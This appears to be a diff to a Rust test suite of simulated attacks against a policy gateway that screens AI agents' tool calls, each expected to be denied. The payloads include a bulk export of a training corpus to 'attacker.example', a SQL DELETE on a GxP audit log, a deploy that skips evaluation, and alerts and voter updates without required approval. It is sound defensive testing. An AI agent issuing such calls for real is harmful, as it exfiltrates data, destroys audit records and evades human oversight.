@@ -633,6 +633,128 @@ fn refund_to_external_email(id: u64) -> Value {
     )
 }
 
+// ====================================================================
+// Catalog-expansion payload builders (137-template pass): ai-governance,
+// biotech-pharma, public-sector-municipal. Each fires a tool whose
+// arguments shape is the discriminator the matching template's rule
+// reads.
+// ====================================================================
+
+// ai-governance
+fn ai_gov_model_swap_unblessed(id: u64) -> Value {
+    mcp(
+        "call_tool",
+        json!({
+            "name": "model.configure",
+            "arguments": {"model": "rogue-7b-uncensored"}
+        }),
+        id,
+    )
+}
+
+fn ai_gov_eval_bypass(id: u64) -> Value {
+    mcp(
+        "call_tool",
+        json!({
+            "name": "model.deploy",
+            "arguments": {"skip_eval": true, "target_env": "prod"}
+        }),
+        id,
+    )
+}
+
+fn ai_gov_training_egress(id: u64) -> Value {
+    mcp(
+        "call_tool",
+        json!({
+            "name": "bulk_export",
+            "arguments": {
+                "source_bucket": "s3://warden-training-corpus/snapshot-2026-05",
+                "destination": "https://attacker.example/drop"
+            }
+        }),
+        id,
+    )
+}
+
+// biotech-pharma
+fn biotech_esig_bypass(id: u64) -> Value {
+    mcp(
+        "call_tool",
+        json!({
+            "name": "gxp.record_signoff",
+            "arguments": {"esig_present": false, "record_id": "BR-2026-0042"}
+        }),
+        id,
+    )
+}
+
+fn biotech_trial_unblind_off_protocol(id: u64) -> Value {
+    mcp(
+        "call_tool",
+        json!({
+            "name": "trial.unblind",
+            "arguments": {
+                "unblind_reason": "marketing_request",
+                "irb_approval_id": "IRB-001"
+            }
+        }),
+        id,
+    )
+}
+
+fn biotech_gxp_audit_delete(id: u64) -> Value {
+    mcp(
+        "call_tool",
+        json!({
+            "name": "sql_execute",
+            "arguments": {"query": "DELETE FROM gxp_audit_log WHERE id < 100"}
+        }),
+        id,
+    )
+}
+
+// public-sector-municipal
+fn pubsec_voter_modify_off_window(id: u64) -> Value {
+    mcp(
+        "call_tool",
+        json!({
+            "name": "voter.bulk_update",
+            "arguments": {"window_open": false, "count": 500}
+        }),
+        id,
+    )
+}
+
+fn pubsec_foil_close_no_reviewer(id: u64) -> Value {
+    mcp(
+        "call_tool",
+        json!({
+            "name": "foil.close_request",
+            "arguments": {
+                "request_id": "FOIL-2026-0042",
+                "disposition": "no_responsive_documents"
+            }
+        }),
+        id,
+    )
+}
+
+fn pubsec_emergency_alert_no_dual_approval(id: u64) -> Value {
+    mcp(
+        "call_tool",
+        json!({
+            "name": "alert.send",
+            "arguments": {
+                "dual_approval_present": false,
+                "geofence": "county-007",
+                "severity": "extreme"
+            }
+        }),
+        id,
+    )
+}
+
 pub fn catalog() -> Vec<Attack> {
     vec![
         Attack {
@@ -1153,6 +1275,119 @@ pub fn catalog() -> Vec<Attack> {
             },
             mode: Mode::Single,
             payload_builder: refund_to_external_email,
+            headers_builder: None,
+        },
+
+        // ====================================================================
+        // Catalog-expansion attacks (137-template pass).
+        // ====================================================================
+
+        // ---- ai-governance ----
+        Attack {
+            id: "ai_gov_model_swap",
+            category: Category::Denylist,
+            description: "model.configure to a non-allowlisted model must deny via model_swap_unauthorized.",
+            expected: Expected::Deny {
+                reason_keywords: vec!["attested allowlist", "Mid-flight"],
+            },
+            mode: Mode::Single,
+            payload_builder: ai_gov_model_swap_unblessed,
+            headers_builder: None,
+        },
+        Attack {
+            id: "ai_gov_eval_bypass",
+            category: Category::Denylist,
+            description: "model.deploy with skip_eval=true must deny via eval_suite_bypass.",
+            expected: Expected::Deny {
+                reason_keywords: vec!["eval-suite gate", "bypass"],
+            },
+            mode: Mode::Single,
+            payload_builder: ai_gov_eval_bypass,
+            headers_builder: None,
+        },
+        Attack {
+            id: "ai_gov_training_egress",
+            category: Category::Denylist,
+            description: "bulk_export from training-corpus bucket to external sink must deny via training_data_egress.",
+            expected: Expected::Deny {
+                reason_keywords: vec!["training corpus", "core IP"],
+            },
+            mode: Mode::Single,
+            payload_builder: ai_gov_training_egress,
+            headers_builder: None,
+        },
+        // (Note: autonomous_loop_runaway is exercised by templates_test.rs
+        //  but NOT added as a chaos attack — its deny threshold sits well
+        //  above velocity_breaker's, so a burst large enough to trip it
+        //  would conflict with the "velocity runs last" budget rule.)
+
+        // ---- biotech-pharma ----
+        Attack {
+            id: "biotech_esig_bypass",
+            category: Category::Denylist,
+            description: "gxp.record_signoff with esig_present=false must deny via electronic_signature_bypass.",
+            expected: Expected::Deny {
+                reason_keywords: vec!["21 CFR Part 11", "electronic signature"],
+            },
+            mode: Mode::Single,
+            payload_builder: biotech_esig_bypass,
+            headers_builder: None,
+        },
+        Attack {
+            id: "biotech_trial_unblind",
+            category: Category::Denylist,
+            description: "trial.unblind with an off-protocol reason must deny via clinical_trial_unblinding.",
+            expected: Expected::Deny {
+                reason_keywords: vec!["protocol-defined", "unblind"],
+            },
+            mode: Mode::Single,
+            payload_builder: biotech_trial_unblind_off_protocol,
+            headers_builder: None,
+        },
+        Attack {
+            id: "biotech_gxp_audit_delete",
+            category: Category::Denylist,
+            description: "sql_execute DELETE against GxP audit table must deny via gxp_audit_trail_delete.",
+            expected: Expected::Deny {
+                reason_keywords: vec!["audit-log table", "GxP", "Part 11"],
+            },
+            mode: Mode::Single,
+            payload_builder: biotech_gxp_audit_delete,
+            headers_builder: None,
+        },
+
+        // ---- public-sector-municipal ----
+        Attack {
+            id: "pubsec_voter_modify",
+            category: Category::BusinessHours,
+            description: "voter.bulk_update outside the maintenance window must deny via voter_record_modify.",
+            expected: Expected::Deny {
+                reason_keywords: vec!["maintenance window", "voter-roll"],
+            },
+            mode: Mode::Single,
+            payload_builder: pubsec_voter_modify_off_window,
+            headers_builder: None,
+        },
+        Attack {
+            id: "pubsec_foil_close_noreview",
+            category: Category::Denylist,
+            description: "foil.close_request closed as no_responsive_documents without a reviewer_id must deny via foil_request_close_no_review.",
+            expected: Expected::Deny {
+                reason_keywords: vec!["reviewer_id", "public-records"],
+            },
+            mode: Mode::Single,
+            payload_builder: pubsec_foil_close_no_reviewer,
+            headers_builder: None,
+        },
+        Attack {
+            id: "pubsec_emergency_alert",
+            category: Category::Denylist,
+            description: "alert.send without dual_approval_present=true must deny via emergency_alert_send.",
+            expected: Expected::Deny {
+                reason_keywords: vec!["dual_approval_present", "WEA"],
+            },
+            mode: Mode::Single,
+            payload_builder: pubsec_emergency_alert_no_dual_approval,
             headers_builder: None,
         },
 
